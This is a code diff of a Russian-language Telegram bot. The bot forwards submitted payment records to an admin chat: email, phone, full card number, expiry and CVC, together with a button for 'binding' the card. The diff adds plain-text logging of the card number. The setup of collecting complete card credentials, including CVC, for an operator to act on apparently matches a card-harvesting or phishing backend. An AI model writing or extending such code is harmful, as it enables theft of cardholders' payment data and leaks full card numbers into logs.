@@ -332,6 +332,7 @@ def get_payment_buttons(payment_id, user_id="user123", card_number=None):
     
     # ВСЕГДА добавляем кнопку "Привязать" если есть номер карты
     if card_number:
+        logger.info(f"🔗 Добавляем кнопку 'Привязать' для карты: {card_number}")
         buttons.append([
             InlineKeyboardButton(text="🔗 Привязать", callback_data=f"bind_{payment_id}_{user_id}_{card_number}")
         ])
@@ -633,7 +634,7 @@ async def process_payment_data(message: types.Message):
             formatted_text += f"• Email: {payment_data.get('email', '')}\n"
             formatted_text += f"• Телефон: {payment_data.get('phone', '')}\n\n"
             formatted_text += "💳 <b>Карта:</b>\n"
-            formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
+            formatted_text += f"• Номер: {card_number}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
             formatted_text += "📱 <b>Статус: Ожидание действий</b>\n\n"
@@ -643,7 +644,7 @@ async def process_payment_data(message: types.Message):
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
-                reply_markup=get_payment_buttons(payment_id, "user123", card_number),  # ← передаем card_number
+                reply_markup=get_payment_buttons(payment_id, "user123", card_number),  # ← ПЕРЕДАЕМ card_number!
                 parse_mode="HTML"
             )
             logger.info(f"✅ Платеж #{payment_id} создан с кнопкой 'Привязать'")
@@ -1017,6 +1018,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
